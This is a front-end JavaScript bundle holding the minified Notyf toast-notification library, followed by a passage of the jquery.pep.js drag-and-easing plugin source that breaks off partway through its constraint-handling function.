var Notyf=function(){"use strict";var n,t,o=function(){return(o=Object.assign||function(t){for(var i,e=1,n=arguments.length;e<n;e++)for(var o in i=arguments[e])Object.prototype.hasOwnProperty.call(i,o)&&(t[o]=i[o]);return t}).apply(this,arguments)},s=(i.prototype.on=function(t,i){var e=this.listeners[t]||[];this.listeners[t]=e.concat([i])},i.prototype.triggerEvent=function(t,i){var e=this;(this.listeners[t]||[]).forEach(function(t){return t({target:e,event:i})})},i);function i(t){this.options=t,this.listeners={}}(t=n=n||{})[t.Add=0]="Add",t[t.Remove=1]="Remove";var v,e,a=(r.prototype.push=function(t){this.notifications.push(t),this.updateFn(t,n.Add,this.notifications)},r.prototype.splice=function(t,i){var e=this.notifications.splice(t,i)[0];return this.updateFn(e,n.Remove,this.notifications),e},r.prototype.indexOf=function(t){return this.notifications.indexOf(t)},r.prototype.onUpdate=function(t){this.updateFn=t},r);function r(){this.notifications=[]}(e=v=v||{}).Dismiss="dismiss";var c={types:[{type:"success",className:"notyf__toast--success",backgroundColor:"#3dc763",icon:{className:"notyf__icon--success",tagName:"i"}},{type:"error",className:"notyf__toast--error",backgroundColor:"#ed3d3d",icon:{className:"notyf__icon--error",tagName:"i"}}],duration:2e3,ripple:!0,position:{x:"right",y:"bottom"},dismissible:!(e.Click="click")},p=(d.prototype.on=function(t,i){var e;this.events=o(o({},this.events),((e={})[t]=i,e))},d.prototype.update=function(t,i){i===n.Add?this.addNotification(t):i===n.Remove&&this.removeNotification(t)},d.prototype.removeNotification=function(t){var i,e,n=this,o=this._popRenderedNotification(t);o&&((e=o.node).classList.add("notyf__toast--disappear"),e.addEventListener(this.animationEndEventName,i=function(t){t.target===e&&(e.removeEventListener(n.animationEndEventName,i),n.container.removeChild(e))}))},d.prototype.addNotification=function(t){var i=this._renderNotification(t);this.notifications.push({notification:t,node:i}),this._announce(t.options.message||"Notification")},d.prototype._renderNotification=function(t){var i,e=this._buildNotificationCard(t),n=t.options.className;return n&&(i=e.classList).add.apply(i,n.split(" ")),this.container.appendChild(e),e},d.prototype._popRenderedNotification=function(t){for(var i=-1,e=0;e<this.notifications.length&&i<0;e++)this.notifications[e].notification===t&&(i=e);if(-1!==i)return this.notifications.splice(i,1)[0]},d.prototype.getXPosition=function(t){var i;return(null===(i=null==t?void 0:t.position)||void 0===i?void 0:i.x)||"right"},d.prototype.getYPosition=function(t){var i;return(null===(i=null==t?void 0:t.position)||void 0===i?void 0:i.y)||"bottom"},d.prototype.adjustContainerAlignment=function(t){var i=this.X_POSITION_FLEX_MAP[this.getXPosition(t)],e=this.Y_POSITION_FLEX_MAP[this.getYPosition(t)],n=this.container.style;n.setProperty("justify-content",e),n.setProperty("align-items",i)},d.prototype._buildNotificationCard=function(n){var t,o=this,i=n.options,e=i.icon;this.adjustContainerAlignment(i);var s=this._createHTLMElement({tagName:"div",className:"notyf__toast"}),a=this._createHTLMElement({tagName:"div",className:"notyf__ripple"}),r=this._createHTLMElement({tagName:"div",className:"notyf__wrapper"}),c=this._createHTLMElement({tagName:"div",className:"notyf__message"});c.innerHTML=i.message||"";var p,d,l,u,f,h=i.background||i.backgroundColor;e&&"object"==typeof e&&(p=this._createHTLMElement({tagName:"div",className:"notyf__icon"}),d=this._createHTLMElement({tagName:e.tagName||"i",className:e.className,text:e.text}),(l=null!==(t=e.color)&&void 0!==t?t:h)&&(d.style.color=l),p.appendChild(d),r.appendChild(p)),r.appendChild(c),s.appendChild(r),h&&(i.ripple?(a.style.background=h,s.appendChild(a)):s.style.background=h),i.dismissible&&(u=this._createHTLMElement({tagName:"div",className:"notyf__dismiss"}),f=this._createHTLMElement({tagName:"button",className:"notyf__dismiss-btn"}),u.appendChild(f),r.appendChild(u),s.classList.add("notyf__toast--dismissible"),f.addEventListener("click",function(t){var i,e;null!==(e=(i=o.events)[v.Dismiss])&&void 0!==e&&e.call(i,{target:n,event:t}),t.stopPropagation()})),s.addEventListener("click",function(t){var i,e;return null===(e=(i=o.events)[v.Click])||void 0===e?void 0:e.call(i,{target:n,event:t})});var m="top"===this.getYPosition(i)?"upper":"lower";return s.classList.add("notyf__toast--"+m),s},d.prototype._createHTLMElement=function(t){var i=t.tagName,e=t.className,n=t.text,o=document.createElement(i);return e&&(o.className=e),o.textContent=n||null,o},d.prototype._createA11yContainer=function(){var t=this._createHTLMElement({tagName:"div",className:"notyf-announcer"});t.setAttribute("aria-atomic","true"),t.setAttribute("aria-live","polite"),t.style.border="0",t.style.clip="rect(0 0 0 0)",t.style.height="1px",t.style.margin="-1px",t.style.overflow="hidden",t.style.padding="0",t.style.position="absolute",t.style.width="1px",t.style.outline="0",document.body.appendChild(t),this.a11yContainer=t},d.prototype._announce=function(t){var i=this;this.a11yContainer.textContent="",setTimeout(function(){i.a11yContainer.textContent=t},100)},d.prototype._getAnimationEndEventName=function(){var t,i=document.createElement("_fake"),e={MozTransition:"animationend",OTransition:"oAnimationEnd",WebkitTransition:"webkitAnimationEnd",transition:"animationend"};for(t in e)if(void 0!==i.style[t])return e[t];return"animationend"},d);function d(){this.notifications=[],this.events={},this.X_POSITION_FLEX_MAP={left:"flex-start",center:"center",right:"flex-end"},this.Y_POSITION_FLEX_MAP={top:"flex-start",center:"center",bottom:"flex-end"};var t=document.createDocumentFragment(),i=this._createHTLMElement({tagName:"div",className:"notyf"});t.appendChild(i),document.body.appendChild(t),this.container=i,this.animationEndEventName=this._getAnimationEndEventName(),this._createA11yContainer()}function l(t){var n=this;this.dismiss=this._removeNotification,this.notifications=new a,this.view=new p;var i=this.registerTypes(t);this.options=o(o({},c),t),this.options.types=i,this.notifications.onUpdate(function(t,i){return n.view.update(t,i)}),this.view.on(v.Dismiss,function(t){var i=t.target,e=t.event;n._removeNotification(i),i.triggerEvent(v.Dismiss,e)}),this.view.on(v.Click,function(t){var i=t.target,e=t.event;return i.triggerEvent(v.Click,e)})}return l.prototype.error=function(t){var i=this.normalizeOptions("error",t);return this.open(i)},l.prototype.success=function(t){var i=this.normalizeOptions("success",t);return this.open(i)},l.prototype.open=function(i){var t=this.options.types.find(function(t){return t.type===i.type})||{},e=o(o({},t),i);this.assignProps(["ripple","position","dismissible"],e);var n=new s(e);return this._pushNotification(n),n},l.prototype.dismissAll=function(){for(;this.notifications.splice(0,1););},l.prototype.assignProps=function(t,i){var e=this;t.forEach(function(t){i[t]=null==i[t]?e.options[t]:i[t]})},l.prototype._pushNotification=function(t){var i=this;this.notifications.push(t);var e=void 0!==t.options.duration?t.options.duration:this.options.duration;e&&setTimeout(function(){return i._removeNotification(t)},e)},l.prototype._removeNotification=function(t){var i=this.notifications.indexOf(t);-1!==i&&this.notifications.splice(i,1)},l.prototype.normalizeOptions=function(t,i){var e={type:t};return"string"==typeof i?e.message=i:"object"==typeof i&&(e=o(o({},e),i)),e},l.prototype.registerTypes=function(t){var i=(t&&t.types||[]).slice();return c.types.map(function(e){var n=-1;i.forEach(function(t,i){t.type===e.type&&(n=i)});var t=-1!==n?i.splice(n,1)[0]:{};return o(o({},e),t)}).concat(i)},l}();  //______________________________________________________________________
  //______________________________________________________________________

    var pluginName = 'pep';
    var defaults   = {

      // Options
      // ----------------------------------------------------------------------------------------------
      // See ** https://github.com/briangonzalez/jquery.pep.js ** for fully documented options.
      // It was too hard to manage options here and in the readme.
      // ----------------------------------------------------------------------------------------------
      initiate:                       function(){},
      start:                          function(){},
      drag:                           function(){},
      stop:                           function(){},
      easing:                         null,
      rest:                           function(){},
      moveTo:                         false,
      callIfNotStarted:               ['stop', 'rest'],
      startThreshold:                 [0,0],
      grid:                           [1,1],
      debug:                          false,
      activeClass:                    'pep-active',
      startClass:                     'pep-start',
      easeClass:                      'pep-ease',
      multiplier:                     1,
      velocityMultiplier:             2.5,
      shouldPreventDefault:           true,
      allowDragEventPropagation:      true,
      stopEvents:                     '',
      hardwareAccelerate:             true,
      useCSSTranslation:              true,
      disableSelect:                  true,
      cssEaseString:                  "cubic-bezier(0.190, 1.000, 0.220, 1.000)",
      cssEaseDuration:                1000,
      shouldEase:                     true,
      droppable:                      false,
      droppableActiveClass:           'pep-dpa',
      overlapFunction:                false,
      constrainTo:                    false,
      removeMargins:                  true,
      place:                          true,
      deferPlacement:                 false,
      axis:                           null,
      forceNonCSS3Movement:           false,
      elementsWithInteraction:        'input',
      revert:                         false,
      revertAfter:                    'stop',
      revertIf:                       function(){ return true; },
      ignoreRightClick:               true,
      startPos:                       {
          left:                           null,
          top:                            null
      },
      useBoundingClientRect:          false
    };

    //  ---------------------------------
    //  -----  Our main Pep object  -----
    //  ---------------------------------
    function Pep( el, options ) {

      this.name = pluginName;

      // reference to our DOM object
      // and it's jQuery equivalent.
      this.el  = el;
      this.$el = $(el);

      //  merge in defaults
      this.options    = $.extend( {}, defaults, options) ;

      // store document/body so we don't need to keep grabbing them
      // throughout the code
      this.$document  = $(this.$el[0].ownerDocument);
      this.$body      = this.$document.find('body');

      //  Create our triggers based on touch/click device
      this.moveTrigger        = "MSPointerMove pointermove touchmove mousemove";
      this.startTrigger       = "MSPointerDown pointerdown touchstart mousedown";
      this.stopTrigger        = "MSPointerUp pointerup touchend mouseup";
      this.startTriggerArray  = this.startTrigger.split(' ');
      this.moveTriggerArray   = this.moveTrigger.split(' ');
      this.stopTriggerArray   = this.stopTrigger.split(' ');
      this.stopEvents         = [ this.stopTrigger, this.options.stopEvents ].join(' ');

      if ( this.options.constrainTo === 'window' )
        this.$container = this.$document;
      else if ( this.options.constrainTo && (this.options.constrainTo !== 'parent') )
        this.$container = $(this.options.constrainTo);
      else
        this.$container = this.$el.parent();

      // IE need this
      if ( this.isPointerEventCompatible() )
        this.applyMSDefaults();

      this.CSSEaseHash    = this.getCSSEaseHash();
      this.scale          = 1;
      this.started        = false;
      this.disabled       = false;
      this.autoAxis       = false;
      this.activeDropRegions = [];
      this.resetVelocityQueue();

      this.init();
      return this;
    }

    //  init();
    //    initialization logic
    //    you already have access to the DOM el and the options via the instance,
    //    e.g., this.el and this.options
    Pep.prototype.init = function () {

      if ( this.options.debug )
        this.buildDebugDiv();

      if ( this.options.disableSelect )
        this.disableSelect();

      // position the parent & place the object, if necessary.
      if ( this.options.place && !this.options.deferPlacement ) {
        this.positionParent();
        this.placeObject();
      }

      this.ev = {};       // to store our event movements
      this.pos = {};      // to store positions
      this.subscribe();
    };

    //  subscribe();
    //    useful in the event we want to programmatically
    //    interact with our Pep object.
    //      e.g.:     $('#pep').trigger('stop')
    Pep.prototype.subscribe = function () {
      var self = this;

      // Subscribe to our start event
      this.onStartEvent = function(ev){ self.handleStart(ev); };
      this.$el.on(this.startTrigger, this.onStartEvent);

      // Add a flag to events that start on elements that should allow interaction
      // so handleStart() can ignore them but allow them to bubble up through the DOM
      this.onStartEventOnElementsWithInteraction = function(ev){ ev.ignorePropagation = true; };
      this.$el.on(
        this.startTrigger,
        this.options.elementsWithInteraction,
        this.onStartEventOnElementsWithInteraction
      );

      // Subscribe to our stop event
      this.onStopEvents = function(ev) { self.handleStop(ev); };
      this.$document.on(this.stopEvents, this.onStopEvents);

      // Subscribe to our move event
      this.onMoveEvents = function(ev){ self.moveEvent = ev; };
      this.$document.on(this.moveTrigger, this.onMoveEvents);
    };

    Pep.prototype.unsubscribe = function() {
      this.$el.off(this.startTrigger, this.onStartEvent);
      this.$el.off(
        this.startTrigger,
        this.options.elementsWithInteraction,
        this.onStartEventOnElementsWithInteraction
      );
      this.$document.off(this.stopEvents, this.onStopEvents);
      this.$document.off(this.moveTrigger, this.onMoveEvents);
    };

    //  handleStart();
    //    once this.startTrigger occurs, handle all of the logic
    //    that must go on. This is where Pep's heavy lifting is done.
    Pep.prototype.handleStart = function(ev) {

      // ignorePropagation is set to true if the event originates from an element
      // listed in this.options.elementsWithInteraction
      if (ev.ignorePropagation) return;

      var self = this;

              // only continue chugging if our start event is a valid move event.
              if ( this.isValidMoveEvent(ev) && !this.disabled ){

                if( !(this.options.ignoreRightClick && ev.which === 3) ) {

                      // IE10 Hack. Me not happy.
                      if ( this.isPointerEventCompatible() && ev.preventManipulation )
                        ev.preventManipulation();

                      // normalize event
                      ev = this.normalizeEvent(ev);

                      // position the parent & place the object, if necessary.
                      if ( this.options.place && this.options.deferPlacement ) {
                        this.positionParent();
                        this.placeObject();
                      }

                      // log it
                      this.log({ type: 'event', event: ev.type });

                      // hardware accelerate, if necessary.
                      if ( this.options.hardwareAccelerate && !this.hardwareAccelerated ) {
                        this.hardwareAccelerate();
                        this.hardwareAccelerated = true;
                      }

                      // fire user's initiate event.
                      var shouldContinue = this.options.initiate.call(this, ev, this);
                      if ( shouldContinue === false )
                        return;


                      // cancel the rest timeout
                      clearTimeout( this.restTimeout );

                      // add active class and reset css animation, if necessary
                      this.$el.addClass( this.options.activeClass );
                      this.removeCSSEasing();

                      // store event's x & y values for later use
                      this.startX = this.ev.x = ev.pep.x;
                      this.startY = this.ev.y = ev.pep.y;

                      // store initial offset.
                      this.initialPosition = this.initialPosition || this.$el.position();

                      // store the initial touch/click event, used to calculate the inital delta values.
                      this.startEvent = this.moveEvent = ev;

                      // make object active, so watchMoveLoop starts looping.
                      this.active     = true;

                      // preventDefault(), is necessary
                      if ( this.options.shouldPreventDefault )
                        ev.preventDefault();

                      // allow / disallow event bubbling
                      if ( !this.options.allowDragEventPropagation )
                        ev.stopPropagation();

                      // animation loop to ensure we don't fire
                      // too many unneccessary repaints
                      (function watchMoveLoop(){
                          if ( !self.active ) return;
                          self.handleMove();
                          self.requestAnimationFrame( watchMoveLoop );
                      })();

                      (function watchEasingLoop(){
                          if ( !self.options.easing ) return;
                          if ( self.easing ) self.options.easing.call(self, null, self);
                          self.requestAnimationFrame( watchEasingLoop );
                      })();
                }
              }
    };

    //  handleMove();
    //    the logic for when the move events occur
    Pep.prototype.handleMove = function() {

              // setup our event object
              if ( typeof(this.moveEvent) === 'undefined' )
                return;

              // get our move event's x & y
              var ev      = this.normalizeEvent( this.moveEvent );
              var curX    = window.parseInt(ev.pep.x / this.options.grid[0]) * this.options.grid[0];
              var curY    = window.parseInt(ev.pep.y / this.options.grid[1]) * this.options.grid[1];

              // last in, first out (LIFO) queue to help us manage velocity
              this.addToLIFO( { time: ev.timeStamp, x: curX, y: curY } );

              // calculate values necessary to moving
              var dx, dy;

              if ( $.inArray( ev.type, this.startTriggerArray ) > -1  ){
                dx = 0;
                dy = 0;
              } else{
                dx = curX - this.ev.x;
                dy = curY - this.ev.y;
              }

              this.dx   = dx;
              this.dy   = dy;
              this.ev.x = curX;
              this.ev.y = curY;

              // no movement in either direction -- so return
              if (dx === 0 && dy === 0){
                this.log({ type: 'event', event: '** stopped **' });
                return;
              }

              // check if object has moved past X/Y thresholds
              // if so, fire users start event
              var initialDx  = Math.abs(this.startX - curX);
              var initialDy  = Math.abs(this.startY - curY);
              if ( !this.started && ( initialDx > this.options.startThreshold[0] || initialDy > this.options.startThreshold[1] ) ){
                this.started = true;
                this.$el.addClass(this.options.startClass);
                this.options.start.call(this, this.startEvent, this);
              }

              // Move before calculate position and fire events
              this.doMoveTo(dx, dy);

              // Calculate our drop regions
              if ( this.options.droppable ) {
                this.calculateActiveDropRegions();
              }

              // fire user's drag event.
              var continueDrag = this.options.drag.call(this, ev, this);

              if ( continueDrag === false ) {
                this.resetVelocityQueue();
                return;
              }

              // log the move trigger & event position
              this.log({ type: 'event', event: ev.type });
              this.log({ type: 'event-coords', x: this.ev.x, y: this.ev.y });
              this.log({ type: 'velocity' });
    };

    Pep.prototype.doMoveTo = function(dx, dy) {
              var hash = this.handleConstraint(dx, dy);
              var xOp, yOp;

              // if using the "auto" axis, determine which axis to use based on
              // whether the user has dragged more along the x or the y axis
              if ( this.options.axis === 'auto' && !this.autoAxis) {
                if ( Math.abs(dx) > Math.abs(dy) ) this.autoAxis = 'x';
                else
                if ( Math.abs(dx) < Math.abs(dy) ) this.autoAxis = 'y';
                // don't move at all if the axis can't be determined
                else {
                  dy = 0;
                  dx = 0;
                }
              }

              // if using not using CSS transforms, move object via absolute position
              if ( typeof this.options.moveTo === 'function') {
                xOp     = ( dx >= 0 ) ? "+=" + Math.abs(dx/this.scale)*this.options.multiplier : "-=" + Math.abs(dx/this.scale)*this.options.multiplier;
                yOp     = ( dy >= 0 ) ? "+=" + Math.abs(dy/this.scale)*this.options.multiplier : "-=" + Math.abs(dy/this.scale)*this.options.multiplier;

                if ( this.options.constrainTo ) {
                  xOp = (hash.x !== false) ? hash.x : xOp;
                  yOp = (hash.y !== false) ? hash.y : yOp;
                }

                // only move along single axis, if necessary
                if ( this.options.axis === 'x' || this.autoAxis === 'x' ) yOp = hash.y;
                if ( this.options.axis === 'y' || this.autoAxis === 'y' ) xOp = hash.x;

                this.options.moveTo.call(this, xOp, yOp);
              } else if ( !this.shouldUseCSSTranslation() ){
                xOp     = ( dx >= 0 ) ? "+=" + Math.abs(dx/this.scale)*this.options.multiplier : "-=" + Math.abs(dx/this.scale)*this.options.multiplier;
                yOp     = ( dy >= 0 ) ? "+=" + Math.abs(dy/this.scale)*this.options.multiplier : "-=" + Math.abs(dy/this.scale)*this.options.multiplier;

                if ( this.options.constrainTo ) {
                  xOp = (hash.x !== false) ? hash.x : xOp;
                  yOp = (hash.y !== false) ? hash.y : yOp;
                }

                // only move along single axis, if necessary
                if ( this.options.axis === 'x' || this.autoAxis === 'x' ) yOp = hash.y;
                if ( this.options.axis === 'y' || this.autoAxis === 'y' ) xOp = hash.x;

                this.moveTo(xOp, yOp);
              }
              else {

                dx = (dx/this.scale)*this.options.multiplier;
                dy = (dy/this.scale)*this.options.multiplier;

                if ( this.options.constrainTo ) {
                  dx = (hash.x === false) ? dx : 0 ;
                  dy = (hash.y === false) ? dy : 0 ;
                }

                // only move along single axis, if necessary
                if ( this.options.axis === 'x' || this.autoAxis === 'x' ) dy = 0;
                if ( this.options.axis === 'y' || this.autoAxis === 'y' ) dx = 0;

                this.moveToUsingTransforms( dx, dy );
              }
    };

    //  handleStop();
    //    the logic for when the stop events occur
    Pep.prototype.handleStop = function(ev) {

              // no need to handle stop event if we're not active
              if (!this.active)
                return;

              // log it
              this.log({ type: 'event', event: ev.type });

              // make object inactive, so watchMoveLoop returns
              this.active = false;

              // make object easing.
              this.easing = true;

              // remove our start class
              this.$el.removeClass(this.options.startClass)
                      .addClass(this.options.easeClass);

              // Calculate our drop regions
              if ( this.options.droppable ) {
                this.calculateActiveDropRegions();
              }

              // fire user's stop event.
              if ( this.started || (!this.started &&  $.inArray('stop', this.options.callIfNotStarted) > -1 ) ) {
                this.options.stop.call(this, ev, this);
              }

              // ease the object, if necessary.
              if (this.options.shouldEase) {
                this.ease(ev, this.started);
              } else {
                this.removeActiveClass();
              }

              if ( this.options.revert && (this.options.revertAfter === 'stop' || !this.options.shouldEase) && ( this.options.revertIf && this.options.revertIf.call(this) ) ) {
                this.revert();
              }

              // this must be set to false after
              // the user's stop event is called, so the dev
              // has access to it.
              this.started = false;

              // reset the auto-axis
              if ( this.autoAxis ) this.autoAxis = false;

              // reset the velocity queue
              this.resetVelocityQueue();

    };

    //  ease();
    //    used in conjunction with the LIFO queue
    //    to ease the object after stop
    Pep.prototype.ease = function(ev, started){

              var pos       = this.$el.position();
              var vel       = this.velocity();
              var dt        = this.dt;
              var x         = (vel.x/this.scale) * this.options.multiplier;
              var y         = (vel.y/this.scale) * this.options.multiplier;

              var hash      = this.handleConstraint(x, y, true);

              // ✪  Apply the CSS3 animation easing magic  ✪
              if ( this.cssAnimationsSupported() )
                this.$el.css( this.getCSSEaseHash() );

              var xOp = ( vel.x > 0 ) ? "+=" + x : "-=" + Math.abs(x);
              var yOp = ( vel.y > 0 ) ? "+=" + y : "-=" + Math.abs(y);

              if ( this.options.constrainTo ) {
                xOp = (hash.x !== false) ? hash.x : xOp;
                yOp = (hash.y !== false) ? hash.y : yOp;
              }

              if ( this.options.axis === 'x' || this.autoAxis === 'x' ) yOp = "+=0";
              if ( this.options.axis === 'y' || this.autoAxis === 'y' ) xOp = "+=0";

              // ease it via JS, the last true tells it to animate.
              var jsAnimateFallback = !this.cssAnimationsSupported() || this.options.forceNonCSS3Movement;
              if (typeof this.options.moveTo === 'function') {
                this.options.moveTo.call(this, xOp, yOp);
              } else {
                this.moveTo(xOp, yOp, jsAnimateFallback);
              }

              // when the rest occurs, remove active class and call
              // user's rest event.
              var self = this;
              this.restTimeout = setTimeout( function(){

                // Calculate our drop regions
                if ( self.options.droppable ) {
                  self.calculateActiveDropRegions();
                }

                self.easing = false;

                // call users rest event.
                if ( started || ( !started && $.inArray('rest', self.options.callIfNotStarted) > -1 ) ) {
                  self.options.rest.call(self, ev, self);
                }

                // revert thy self!
                if ( self.options.revert && (self.options.revertAfter === 'ease' && self.options.shouldEase) && ( self.options.revertIf && self.options.revertIf.call(self) ) ) {
                  self.revert();
                }

                // remove active class
                self.removeActiveClass();

              }, this.options.cssEaseDuration );

    };

    // normalizeEvent()
    Pep.prototype.normalizeEvent = function(ev) {
        ev.pep        = {};

        if ( this.isTouch(ev) ) {

          ev.pep.x      = ev.originalEvent.touches[0].pageX;
          ev.pep.y      = ev.originalEvent.touches[0].pageY;
          ev.pep.type   = ev.type;

        }
        else if ( this.isPointerEventCompatible() || !this.isTouch(ev) ) {

          if ( ev.pageX  ) {
            ev.pep.x      = ev.pageX;
            ev.pep.y      = ev.pageY;
          } else {
            ev.pep.x      = ev.originalEvent.pageX;
            ev.pep.y      = ev.originalEvent.pageY;
          }

          ev.pep.type   = ev.type;

        }

        return ev;
     };

    // resetVelocityQueue()
    //
    Pep.prototype.resetVelocityQueue = function() {
      this.velocityQueue = new Array(5);
    };

    //  moveTo();
    //    move the object to an x and/or y value
    //    using jQuery's .css function -- this fxn uses the
    //    .css({top: "+=20", left: "-=30"}) syntax
    Pep.prototype.moveTo = function(x,y, animate) {

      this.log({ type: 'delta', x: x, y: y });
      if ( animate ) {
        this.$el.animate({ top: y, left: x }, 0, 'easeOutQuad', {queue: false});
      } else{
        this.$el.stop(true, false).css({ top: y , left: x });
      }

    };

    //  moveToUsingTransforms();
    //    move the object to an x and/or y value
    Pep.prototype.moveToUsingTransforms = function(x,y) {

      // Check for our initial values if we don't have them.
      var matrixArray  = this.matrixToArray( this.matrixString() );
      if ( !this.cssX )
        this.cssX = this.xTranslation( matrixArray );

      if ( !this.cssY )
        this.cssY = this.yTranslation( matrixArray );

      // CSS3 transforms are additive from current position
      this.cssX = this.cssX + x;
      this.cssY = this.cssY + y;

      this.log({ type: 'delta', x: x, y: y });

      matrixArray[4]    = this.cssX;
      matrixArray[5]    = this.cssY;

      this.translation  = this.arrayToMatrix( matrixArray );
      this.transform( this.translation );
    };

    Pep.prototype.transform = function(value) {
      this.$el.css({
          '-webkit-transform': value,
             '-moz-transform': value,
              '-ms-transform': value,
               '-o-transform': value,
                  'transform': value  });
    };

    Pep.prototype.xTranslation = function(matrixArray) {
      matrixArray  = matrixArray || this.matrixToArray( this.matrixString() );
      return parseInt(matrixArray[4], 10);
    };

    Pep.prototype.yTranslation = function(matrixArray) {
      matrixArray  = matrixArray || this.matrixToArray( this.matrixString() );
      return parseInt(matrixArray[5], 10);
    };


    // 3 helper functions for working with the
    // objects CSS3 transforms
    // matrixString
    // matrixToArray
    // arrayToMatrix
    Pep.prototype.matrixString = function() {

      var validMatrix = function(o){
        return !( !o || o === 'none' || o.indexOf('matrix') < 0  );
      };

      var matrix = "matrix(1, 0, 0, 1, 0, 0)";

      if ( validMatrix( this.$el.css('-webkit-transform') ) )
        matrix = this.$el.css('-webkit-transform');

      if ( validMatrix( this.$el.css('-moz-transform') ) )
        matrix = this.$el.css('-moz-transform');

      if ( validMatrix( this.$el.css('-ms-transform') ) )
        matrix = this.$el.css('-ms-transform');

      if ( validMatrix( this.$el.css('-o-transform') ) )
        matrix = this.$el.css('-o-transform');

      if ( validMatrix( this.$el.css('transform') ) )
        matrix = this.$el.css('transform');

      return matrix;
    };

    Pep.prototype.matrixToArray = function(str) {
        return str.split('(')[1].split(')')[0].split(',');
    };

    Pep.prototype.arrayToMatrix = function(array) {
        return "matrix(" +  array.join(',')  + ")";
    };

    //  addToLIFO();
    //    a Last-In/First-Out array of the 5 most recent
    //    velocity points, which is used for easing
    Pep.prototype.addToLIFO = function(val){
      // last in, first out
      var arr = this.velocityQueue;
      arr = arr.slice(1, arr.length);
      arr.push(val);
      this.velocityQueue = arr;
    };

    //  velocity();
    //    using the LIFO, calculate velocity and return
    //    velocity in each direction (x & y)
    Pep.prototype.velocity = function(){
      var sumX = 0;
      var sumY = 0;

      for ( var i = 0; i < this.velocityQueue.length -1; i++  ){
        if ( this.velocityQueue[i] ){
          sumX        += (this.velocityQueue[i+1].x - this.velocityQueue[i].x);
          sumY        += (this.velocityQueue[i+1].y - this.velocityQueue[i].y);
          this.dt     = ( this.velocityQueue[i+1].time - this.velocityQueue[i].time );
        }
      }

      // return velocity in each direction.
      return { x: sumX*this.options.velocityMultiplier, y: sumY*this.options.velocityMultiplier};
    };

    Pep.prototype.revert = function() {
      if ( this.shouldUseCSSTranslation() ){
        this.moveToUsingTransforms(-this.xTranslation(),-this.yTranslation());
      }

      if (this.options.place) {
        this.moveTo(this.initialPosition.left, this.initialPosition.top);
      }
    };

    //  requestAnimationFrame();
    //    requestAnimationFrame Polyfill
    //    More info:
    //    http://paulirish.com/2011/requestanimationframe-for-smart-animating/
    Pep.prototype.requestAnimationFrame = function(callback) {
      return  window.requestAnimationFrame        && window.requestAnimationFrame(callback)         ||
              window.webkitRequestAnimationFrame  && window.webkitRequestAnimationFrame(callback)   ||
              window.mozRequestAnimationFrame     && window.mozRequestAnimationFrame(callback)      ||
              window.oRequestAnimationFrame       && window.mozRequestAnimationFrame(callback)      ||
              window.msRequestAnimationFrame      && window.msRequestAnimationFrame(callback)       ||
              window.setTimeout(callback, 1000 / 60);
    };

    //  positionParent();
    //    add the right positioning to the parent object
    Pep.prototype.positionParent = function() {

      if ( !this.options.constrainTo || this.parentPositioned )
        return;

      this.parentPositioned = true;

      // make `relative` parent if necessary
      if ( this.options.constrainTo === 'parent' ) {
        this.$container.css({ position: 'relative' });
      } else if ( this.options.constrainTo === 'window'             &&
                  this.$container.get(0).nodeName !== "#document"   &&
                  this.$container.css('position') !== 'static' )
      {
        this.$container.css({ position: 'static' });
      }

    };

    //  placeObject();
    //    add the right positioning to the object
    Pep.prototype.placeObject = function() {

      if ( this.objectPlaced )
        return;

      this.objectPlaced = true;

      this.offset = (this.options.constrainTo === 'parent' || this.hasNonBodyRelative() ) ?
                      this.$el.position() : this.$el.offset();

      // better to leave absolute position alone if
      // it already has one.
      if ( parseInt( this.$el.css('left'), 10 ) )
        this.offset.left = this.$el.css('left');

      if (typeof this.options.startPos.left === "number")
          this.offset.left = this.options.startPos.left;

      if ( parseInt( this.$el.css('top'), 10 ) )
        this.offset.top = this.$el.css('top');

      if (typeof this.options.startPos.top === "number")
          this.offset.top = this.options.startPos.top;

      if ( this.options.removeMargins )
        this.$el.css({margin: 0});

      this.$el.css({
        position:   'absolute',
        top:        this.offset.top,
        left:       this.offset.left
      });

    };

    //  hasNonBodyRelative()
    //    returns true if any parent other than the body
    //    has relative positioning
    Pep.prototype.hasNonBodyRelative = function() {
      return this.$el.parents().filter(function() {
          var $this = $(this);
          return $this.is('body') || $this.css('position') === 'relative';
      }).length > 1;
    };

    //  setScale()
    //    set the scale of the object being moved.
    Pep.prototype.setScale = function(val) {
      this.scale = val;
    };

    //  setMultiplier()
    //    set the multiplier of the object being moved.
    Pep.prototype.setMultiplier = function(val) {
      this.options.multiplier = val;
    };

    //  removeCSSEasing();
    //    remove CSS easing properties, if necessary
    Pep.prototype.removeCSSEasing = function() {
      if ( this.cssAnimationsSupported() )
        this.$el.css( this.getCSSEaseHash(true) );
    };

    //  disableSelect();
    //    add the property which causes the object
    //    to not be selected user drags over text areas
    Pep.prototype.disableSelect = function() {

      this.$el.css({
        '-webkit-touch-callout' : 'none',
          '-webkit-user-select' : 'none',
           '-khtml-user-select' : 'none',
             '-moz-user-select' : 'none',
              '-ms-user-select' : 'none',
                  'user-select' : 'none'
      });

    };

    // removeActiveClass()
    //  Removes the active class.
    Pep.prototype.removeActiveClass = function() {
      this.$el.removeClass( [this.options.activeClass, this.options.easeClass].join(' ') );
    };

    //  handleConstraint();
    //    returns a hash of where to move to
    //    when we constrain to parent/window
    Pep.prototype.handleConstraint = function(dx, dy, accountForTranslation) {
      var pos               = this.$el.position();
      this.pos.x            = pos.left;
      this.pos.y            = pos.top;

      var hash              = { x: false, y: false };

      var upperYLimit, upperXLimit, lowerXLimit, lowerYLimit;

      // log our positions
      this.log({ type: "pos-coords", x: this.pos.x, y: this.pos.y});

      if ( $.isArray( this.options.constrainTo ) ) {

        if ( this.options.constrainTo[3] !== undefined && this.options.constrainTo[1] !== undefined ) {
          upperXLimit     = this.options.constrainTo[1] === false ?  Infinity : this.options.constrainTo[1];
          lowerXLimit     = this.options.constrainTo[3] === false ? -Infinity : this.options.constrainTo[3];
        }
        if ( this.options.constrainTo[0] !== false && this.options.constrainTo[2] !== false ) {
          upperYLimit       = this.options.constrainTo[2] === false ?  Infinity : this.options.constrainTo[2];
          lowerYLimit       = this.options.constrainTo[0] === false ? -Infinity : this.options.constrainTo[0];
        }

        // is our object trying to move outside lower X & Y limits?
        if ( this.pos.x + dx < lowerXLimit)     hash.x = lowerXLimit;
        if ( this.pos.y + dy < lowerYLimit)     hash.y = lowerYLimit;

      } else if ( typeof this.options.constrainTo === 'string' ) {
        lowerXLimit       = 0;
        lowerYLimit       = 0;
        upperXLimit       = this.$container.width()  - (this.options.useBoundingClientRect ? this.$el[0].getBoundingClientRect().width : this.$el.outerWidth());
